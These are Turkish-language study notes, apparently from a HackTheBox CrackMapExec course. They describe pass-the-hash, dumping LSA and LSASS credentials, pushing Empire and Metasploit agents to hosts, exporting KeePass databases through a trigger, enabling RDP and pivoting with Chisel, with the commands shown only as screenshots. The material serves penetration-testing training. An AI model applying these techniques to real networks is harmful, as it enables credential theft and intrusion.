+### Yalnızca Enabled Hesapları Gösterme
+![Pasted image 20241203105248.png](/img/user/resimler/Pasted%20image%2020241203105248.png)
+![Pasted image 20241203105301.png](/img/user/resimler/Pasted%20image%2020241203105301.png)
+![Pasted image 20241203105312.png](/img/user/resimler/Pasted%20image%2020241203105312.png)
+![Pasted image 20241203105319.png](/img/user/resimler/Pasted%20image%2020241203105319.png)
+
+
+### Using the Secrets (hashes)
+
+Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için Pass the Hash tekniğini kullanabiliriz. 
+
+CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren -H seçeneğine sahiptir:
+
+
+### Using NTLM Hashes
+![Pasted image 20241203105537.png](/img/user/resimler/Pasted%20image%2020241203105537.png)
+
+NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir
+
+
+### LSA Secrets/Cached Credentials
+
+CrackMapExec, herhangi bir aracı çalıştırmadan remote makineden hash'leri dökmek için çeşitli teknikler uygulayan impacket-secretsdump'dan taşınan --lsa seçeneği ile birlikte gelir. Önbelleğe alınmış kimlik bilgileri, local makine key listesi,[ Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları ve servis kimlik bilgileri dahil olmak üzere LSA Sırlarını döker.
+
+LSA Secrets, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
+
+
+
+### LSA'yı inceleyin
+
+![Pasted image 20241203105931.png](/img/user/resimler/Pasted%20image%2020241203105931.png)
+![Pasted image 20241203105942.png](/img/user/resimler/Pasted%20image%2020241203105942.png)
+
+DCC2$ ile başlayan hash formatı Domain Cached Credentials 2 (DCC2), MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse Hashcat kullanılarak kırılabilir çünkü bu algoritma NTLM'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri Pas the Hash saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, $DCC2$ 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.
+
+
+### Cracking Hashes
+![Pasted image 20241203110157.png](/img/user/resimler/Pasted%20image%2020241203110157.png)
+
+
+![Pasted image 20241203110211.png](/img/user/resimler/Pasted%20image%2020241203110211.png)
+![Pasted image 20241203110216.png](/img/user/resimler/Pasted%20image%2020241203110216.png)
+
+
+
+### LSASS'tan Gettings Secrets
+LSASS prosesinin belleği, Windows parolalarını açık metin olarak veya NTLM veya AES256/AES128 gibi diğer hash biçimlerini içerir. Belleği boşaltmak, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.
+
+CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:
+
+17. [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dökümündeki gerekli baytları uzaktan okumak için Impacket projesini ve kimlik bilgilerini çıkarmak için pypykatz kullanır.
+
+
+### Lsassy Module
+
+![Pasted image 20241203113833.png](/img/user/resimler/Pasted%20image%2020241203113833.png)
+
+18. Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft Procdump'ı ve kimlik bilgilerini çıkarmak için pypykatz'ı kullanır.
+
+
+### Procdump Module
+![Pasted image 20241203114045.png](/img/user/resimler/Pasted%20image%2020241203114045.png)
+![Pasted image 20241203114101.png](/img/user/resimler/Pasted%20image%2020241203114101.png)
+
+19. HandleKatz bu araç, LSASS'a klonlanmış handle'ların kullanımını göstererek aynı şekilde gizlenmiş bir bellek dökümü oluşturur
+
+
+### Handlekatz Module
+
+![Pasted image 20241203114136.png](/img/user/resimler/Pasted%20image%2020241203114136.png)
+![Pasted image 20241203114143.png](/img/user/resimler/Pasted%20image%2020241203114143.png)
+![Pasted image 20241203114156.png](/img/user/resimler/Pasted%20image%2020241203114156.png)
+
+
+20. Nanodump, LSASS prosesinin bir minidump'ını oluşturan esnek bir araçtır. LSASS'a bir handle açılması tespit edilebildiğinden, Nanodump LSASS'a mevcut handle'ları arayabilir. Bir tane bulunursa, onu kopyalayacak ve minidump oluşturmak için kullanacaktır. Böyle bir handle bulmanın garanti olmadığını unutmayın.
+
+
+### Nanodump Module
+
+![Pasted image 20241203114243.png](/img/user/resimler/Pasted%20image%2020241203114243.png)
+![Pasted image 20241203114252.png](/img/user/resimler/Pasted%20image%2020241203114252.png)
+![Pasted image 20241203114300.png](/img/user/resimler/Pasted%20image%2020241203114300.png)
+
+Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.
+
+
+### C2 Framework'te Oturumlar Alma
+CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla keşif yapmak veya Empire veya Metasploit gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir agent almak için CrackMapExec'i kullanabiliriz.
+
+Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.
+
+
+### Empire
+
+Web sitelerinde sağlanan kılavuzu kullanarak Empire framework'ü yükleyerek başlayacağız
+
+
+### Empire Server'ı Kurun ve Başlatın
+
+![Pasted image 20241203120126.png](/img/user/resimler/Pasted%20image%2020241203120126.png)
+
+Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz empireadmin kullanıcı adını ve HackTheBoxCME şifresini kullanacağız! .
+
+
+### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma
+![Pasted image 20241203120243.png](/img/user/resimler/Pasted%20image%2020241203120243.png)
+
+Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.
+
+CrackMapExec yapılandırma dosyası varsayılan olarak ~/.cme/cme.conf adresinde bulunur. [Empire] seçeneğini empireadmin kullanıcı adı ve HackTheBoxCME şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server 1337 portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.
+
+
+### CrackMapExec Configuration File
+
+![Pasted image 20241203120720.png](/img/user/resimler/Pasted%20image%2020241203120720.png)
+![Pasted image 20241203120727.png](/img/user/resimler/Pasted%20image%2020241203120727.png)
+
+Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya empire/client/config.yaml adresinde bulunur:
+
+
+### İnceleme
+
+![Pasted image 20241203120800.png](/img/user/resimler/Pasted%20image%2020241203120800.png)
+![Pasted image 20241203120806.png](/img/user/resimler/Pasted%20image%2020241203120806.png)
+
+Yapılandırma dosyaları değiştirildikten sonra, Empire istemcisi ile Empire sunucusuna bağlanmalıyız
+
+
+### Empire Client Connection
+
+![Pasted image 20241203120835.png](/img/user/resimler/Pasted%20image%2020241203120835.png)
+![Pasted image 20241203120840.png](/img/user/resimler/Pasted%20image%2020241203120840.png)
+![Pasted image 20241203120846.png](/img/user/resimler/Pasted%20image%2020241203120846.png)
+
+Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.
+
+
+### Empire Setting up IP and Port
+![Pasted image 20241203120914.png](/img/user/resimler/Pasted%20image%2020241203120914.png)
+
+Artık dinleyicimiz çalışıyor ve empire_exec modülü ile Empire'a bir agent almak için CrackMapExec'i kullanabiliriz. Ayarladığımız dinleyici olan LISTENER=http seçeneğini eklememiz gerekiyor.
+
+
+### CrackMapExec Modülünü Kullanma empire_exec
+
+![Pasted image 20241203121001.png](/img/user/resimler/Pasted%20image%2020241203121001.png)
+
+Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.
+
+![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)
+
+
+### Metasploit
+
+Aynı şeyi CrackMapExec modülü web_delivery kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te web_delivery modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve web_delivery işleyicisini yapılandıralım
+
+
+### Metasploit Configure web_delivery Handler
+
+![Pasted image 20241203121139.png](/img/user/resimler/Pasted%20image%2020241203121139.png)
+![Pasted image 20241203121202.png](/img/user/resimler/Pasted%20image%2020241203121202.png)
+
+Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. URL ve PAYLOAD olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer x64 kullanıyorsak, x64 varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da PAYLOAD=64 kullanabiliriz. Eğer 32 bit payload kullanıyorsak PAYLOAD=32 seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:
+
+
+### CrackMapExec web_delivery Module
+
+![Pasted image 20241203121251.png](/img/user/resimler/Pasted%20image%2020241203121251.png)
+![Pasted image 20241203121301.png](/img/user/resimler/Pasted%20image%2020241203121301.png)
+
+
+![Pasted image 20241203121307.png](/img/user/resimler/Pasted%20image%2020241203121307.png)
+
+Metasploit'te yeni bir oturum görmeliyiz:
+
+![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)
+
+
+### Other C2 Frameworks
+Başka bir C2 Framework kullanmak istediğimizde, **Komut Yürütme** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **--no-output** seçeneğini seçmemiz gerekecektir.
+
+Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:
+
+![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)
+
+Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.
+
+
+### Bloodhound Entegrasyonu
+
+BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. Eğer böyle bir durum söz konusu değilse, Bloodhound hakkında daha fazla bilgiyi Active Directory Bloodhound modülünde bulabilir veya Bloodhound resmi belgelerine göz atabilirsiniz.
+
+
+### Bloodhound Mark Sahipli olarak
+
+BloodHound'da bir düğümü (kullanıcı, grup, bilgisayar vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için düğüme sağ tıklayıp **Mark X as Owned** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **Shortest Path from Owned Principals** (Ele Geçirilmiş İlkelerden En Kısa Yol) veya **Shortest Paths to Domain Admins from Owned Principals** (Ele Geçirilmiş İlkelerden Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.
+
+CrackMapExec'i, ele geçirdiğimiz herhangi bir kullanıcı veya bilgisayarı BloodHound veritabanında sahipli olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, ~/.cme/cme.conf adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:
+
+* Bloodhound yapılandırma seçeneği bh_enabled'ı True olarak ayarlayın.
+* bh_uri'yi Bloodhound veritabanı IP adresimize ayarlayın.
+* bh_port'u veritabanı portuna ayarlayın
+* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı neo4j ve şifre HackTheBoxCME! (Veritabanınıza karşılık geleni kullandığınızdan emin olun).
+
+Yapılandırma aşağıdaki gibi görünmelidir:
+
+
+### Configuring BloodHound Database
+
+![Pasted image 20241203122852.png](/img/user/resimler/Pasted%20image%2020241203122852.png)
+
+Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.
+
+
+### Bloodhound Verilerinin Toplanması
+BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.
+
+
+### BloodHound verilerinin toplanması
+
+![Pasted image 20241203122958.png](/img/user/resimler/Pasted%20image%2020241203122958.png)
+![Pasted image 20241203123005.png](/img/user/resimler/Pasted%20image%2020241203123005.png)
+
+![Pasted image 20241203123037.png](/img/user/resimler/Pasted%20image%2020241203123037.png)
+
+
+![Pasted image 20241203125002.png](/img/user/resimler/Pasted%20image%2020241203125002.png)
+![Pasted image 20241203125011.png](/img/user/resimler/Pasted%20image%2020241203125011.png)
+
+Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.
+
+
+### BloodHound'da Kullanıcıları Owned Olarak Ayarlama
+
+Veriler içe aktarıldıktan sonra, robert kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.
+
+
+### Kullanıcı BloodHound'da Owned Olarak Eklendi
+
+![Pasted image 20241203125602.png](/img/user/resimler/Pasted%20image%2020241203125602.png)
+
+Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.
+
+
+### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme
+![Pasted image 20241203125648.png](/img/user/resimler/Pasted%20image%2020241203125648.png)
+![Pasted image 20241203125657.png](/img/user/resimler/Pasted%20image%2020241203125657.png)
+![Pasted image 20241203125712.png](/img/user/resimler/Pasted%20image%2020241203125712.png)
+![Pasted image 20241203125718.png](/img/user/resimler/Pasted%20image%2020241203125718.png)
+
+Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, --ntds veya --lsa seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak procdump veya lsassy gibi modüller kullanıcıları sahip olunan olarak işaretler.
+
+
+### BloodHound'da Bilgisayarları Owned Olarak Ayarlama
+
+Yazım sırasında, BloodHound entegrasyonu yalnızca kullanıcıları Owned olarak işaretlemektedir. Bir bilgisayarı owned olarak işaretlemek istiyorsak, bh_owned modülünü ve neo4j veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca PASS seçeneğini ekleyeceğiz.
+
+![Pasted image 20241203125824.png](/img/user/resimler/Pasted%20image%2020241203125824.png)
+
+![Pasted image 20241203125832.png](/img/user/resimler/Pasted%20image%2020241203125832.png)
+
+
+BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.
+
+
+### Popular Modules
+
+CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.
+
+
+### LDAP Protocol Modules
+
+LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.
+
+
+### **LDAP Module - get-network**
+
+get-network modülü [Active Directory Integrated DNS](https://github.com/dirkjanm/adidnsdump) dökümünü temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, zone transferine benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, dahili ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.
+
+Modülü kullanmanın üç (3) yolu vardır:
+Sadece IP adresini almak.
+Sadece domain isimlerini al.
+Her ikisini de al (IP ve domain adları).
+
+Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. ALL=true seçeneğini seçersek, hem IP hem de domain adlarını alır ve ONLY_HOSTS=true olarak belirtirsek, yalnızca FQDN'yi alırız.
+
+
+### DNS Sunucusundan Kayıtları Alma
+![Pasted image 20241203130413.png](/img/user/resimler/Pasted%20image%2020241203130413.png)
+
+![Pasted image 20241203130427.png](/img/user/resimler/Pasted%20image%2020241203130427.png)
+![Pasted image 20241203130436.png](/img/user/resimler/Pasted%20image%2020241203130436.png)
+
+![Pasted image 20241203130443.png](/img/user/resimler/Pasted%20image%2020241203130443.png)
+
+Not: Yazım sırasında, modülün `adidnsdump` aracıyla bazı farklılıkları vardır. Sonuçlar bir hesaptan diğerine farklı olabilir
+
+
+### LDAP Module - laps
+Bir başka harika modül de laps . Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya parola sıfırlama talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için COMPUTER seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir joker karakterle birlikte kullanabiliriz.
+
+
+### LAPS Modülü Parolaların Alınması
+![Pasted image 20241203130705.png](/img/user/resimler/Pasted%20image%2020241203130705.png)
+
+![Pasted image 20241203130838.png](/img/user/resimler/Pasted%20image%2020241203130838.png)
+![Pasted image 20241203130844.png](/img/user/resimler/Pasted%20image%2020241203130844.png)
+
+Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır
+
+
+### LDAP Modülü - MAQ
+[MS-DS-Machine-AccountQuot](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)a özniteliği ile temsil edilen Machine Account Quota (MAQ), varsayılan olarak bir kullanıcının bir domain içinde oluşturmasına izin verilen bilgisayar hesaplarının sayısını gösteren domain düzeyinde bir özniteliktir.
+
+Domain'de bir makine oluşturmamızı gerektiren [Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) gibi birkaç saldırı vardır ve bu nedenle hesap makinesi kotası özelliğini numaralandırmak çok önemlidir.
+
+
+### Machine Quota Module
+![Pasted image 20241203131107.png](/img/user/resimler/Pasted%20image%2020241203131107.png)
+
+
+### LDAP Module - daclread
+
+Bir başka harika modül ise bir veya birden fazla nesnenin DACL'lerini okumamızı ve dışa aktarmamızı sağlayan daclread'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:
+
+
+### daclread Module Options
+
+![Pasted image 20241203131203.png](/img/user/resimler/Pasted%20image%2020241203131203.png)
+
+Diyelim ki grace hesabının tüm ACE'lerini okumak istiyoruz. TARGET seçeneğini ve ACTION read seçeneğini kullanabiliriz:
+
+
+### Grace Kullanıcısının DACL'sini Oku
+
+![Pasted image 20241203131236.png](/img/user/resimler/Pasted%20image%2020241203131236.png)
+![Pasted image 20241203131242.png](/img/user/resimler/Pasted%20image%2020241203131242.png)
+
+
+Hangi sorumluların DCSync haklarına sahip olduğu gibi belirli hakları da arayabiliriz. TARGET_DN seçeneğini kullanmamız ve ayırt edici alan adını (DN), okunan ACTION'ı ve RIGHTS seçeneği ile aramak istediğimiz hakları belirtmemiz gerekir.
+
+
+### Searching for Users with DCSync Rights
+![Pasted image 20241203131416.png](/img/user/resimler/Pasted%20image%2020241203131416.png)
+![Pasted image 20241203131423.png](/img/user/resimler/Pasted%20image%2020241203131423.png)
+![Pasted image 20241203131432.png](/img/user/resimler/Pasted%20image%2020241203131432.png)
+
+Çıktıda gösterildiği gibi, ACE[4] robert kullanıcısının hedef domain'de DCSync haklarına sahip olduğunu gösterir.
+
+LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için -L seçeneğini kullanabiliriz.
+
+### LDAP Protocol Modules
+
+![Pasted image 20241203131512.png](/img/user/resimler/Pasted%20image%2020241203131512.png)
+
+
+
+### SMB Protocol Modules
+SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.
+
+Not: SMB kullanan modüllerin çoğunun çalışması için yönetici haklarına ( Pwned! ) ihtiyaç vardır.
+
+
+### SMB Modülleri - get_netconnections ve ioxidresolver
+Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. get_netconnections ve ioxidresolver modüllerini kullanalım ve farklarını görelim.
+
+get_netconnections modülü, ağ bağlantılarını sorgulamak için WMI kullanır. IPv6 ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.
+
+
+### get_netconnections Module
+![Pasted image 20241203142100.png](/img/user/resimler/Pasted%20image%2020241203142100.png)
+
+
+Öte yandan, ioxidresolver modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül IPv6 adreslerini içermez.
+
+
+### ioxidresolver Module
+![Pasted image 20241203142142.png](/img/user/resimler/Pasted%20image%2020241203142142.png)
+![Pasted image 20241203142148.png](/img/user/resimler/Pasted%20image%2020241203142148.png)
+
+Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.
+
+
+### SMB Module - keepass_discover
+
+KeePass, kurumsal ağlarda yöneticiler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir parola yöneticisidir. Bir ana parola onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.
+
+### KeePass'i Keşfetme
+
+![Pasted image 20241203142341.png](/img/user/resimler/Pasted%20image%2020241203142341.png)
+
+Eğer ana parolaya sahip değilsek bir alternatif de Lee Christensen ( @tifkin_) ve Will Schroeder ( @harmj0y) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın tetikleme sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [tetikleyici](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.
+
+Bunu kullanmak için beş (5) adıma ihtiyacımız var:
+
+21. KeePass yapılandırma dosyasını bulun. Biz bunu keepass_discover modülü ile yaptık.
+22. ACTION=ADD seçeneğini ve KEEPASS_CONFIG_PATH öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.
+
+### KeePass Yapılandırma Dosyasına Trigger Ekleme
+![Pasted image 20241203142642.png](/img/user/resimler/Pasted%20image%2020241203142642.png)
+Not: KeePass yapılandırma yolu için ters eğik çizgi (/) veya çift eğik çizgi (\) kullandığınızdan emin olun.
+
+Kullanıcının KeePass'i açmasını ve ana parolayı girmesini bekleyin. Bu işlemi zorlamak için ACTION=RESTART seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, USER=julio gibi kullanıcı adı ile USER seçeneğini ekleyebiliriz.
+
+![Pasted image 20241203142812.png](/img/user/resimler/Pasted%20image%2020241203142812.png)
+
+ACTION=POLL seçeneğini kullanarak dışa aktarılan veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.
+
+
+### Ele Geçirilen Hedeften Dışa Aktarılan Verilerin Yoklanması
+![Pasted image 20241203142916.png](/img/user/resimler/Pasted%20image%2020241203142916.png)
+
+![Pasted image 20241203142924.png](/img/user/resimler/Pasted%20image%2020241203142924.png)
+
+ACTION=CLEAN seçeneğini ve KEEPASS_CONFIG_PATH'i kullanarak yapılandırma dosyasını temizleyin
+
+
+### Clean Configuration File Changes
+
+![Pasted image 20241203143132.png](/img/user/resimler/Pasted%20image%2020241203143132.png)
+![Pasted image 20241203143139.png](/img/user/resimler/Pasted%20image%2020241203143139.png)
+
+Bu modül için her bir seçeneği öğrendik, ancak ACTION=ALL ile hepsini bir kerede alabiliriz. Bu seçeneğin iyi yanı, .xml dosyasında herhangi bir parola girişi arayan ve bunu konsola yazdıran extract_password yöntemini içermesidir.
+
+
+### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma
+
+![Pasted image 20241203143219.png](/img/user/resimler/Pasted%20image%2020241203143219.png)
+![Pasted image 20241203143229.png](/img/user/resimler/Pasted%20image%2020241203143229.png)
+Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre /tmp/export.xml dosyasında olacaktır, böylece manuel olarak alabiliriz.
+
+
+### RDP'yi Etkinleştirme veya Devre Dışı Bırakma
+Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü yanal hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.
+
+Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. ACTION seçeneğini ve ardından enable veya disable seçeneklerini belirtmemiz gerekir.
+
+
+### RDP'yi Etkinleştirme
+![Pasted image 20241203143718.png](/img/user/resimler/Pasted%20image%2020241203143718.png)
+![Pasted image 20241203143723.png](/img/user/resimler/Pasted%20image%2020241203143723.png)
+
+SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için -L seçeneğini kullanabiliriz.
+
+
+### SMB Protocol Modules
+![Pasted image 20241203143808.png](/img/user/resimler/Pasted%20image%2020241203143808.png)
+
+Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız
+
+
+### Vulnerability Scan Modules
+Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.
+
+CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.
+
+
+### Ortamın Kurulması
+Bu senaryoda, bir sunucuyu ele geçirdik ve yönetici kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi 172.16.10.3'tür.
+
+Alana erişim sağlamak için, CME ile Proxy Zincirleri bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız
+
+
+### Chisel'i Hedef Makineye Gönderme
+![Pasted image 20241203144114.png](/img/user/resimler/Pasted%20image%2020241203144114.png)
+
+
+### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma
+![Pasted image 20241203144152.png](/img/user/resimler/Pasted%20image%2020241203144152.png)
+![Pasted image 20241203144157.png](/img/user/resimler/Pasted%20image%2020241203144157.png)
+
+
+### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama
+
+![Pasted image 20241203144219.png](/img/user/resimler/Pasted%20image%2020241203144219.png)
+
+
+### Vulnerability Scan Modules
+
+CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.
+
+
+### ZeroLogon
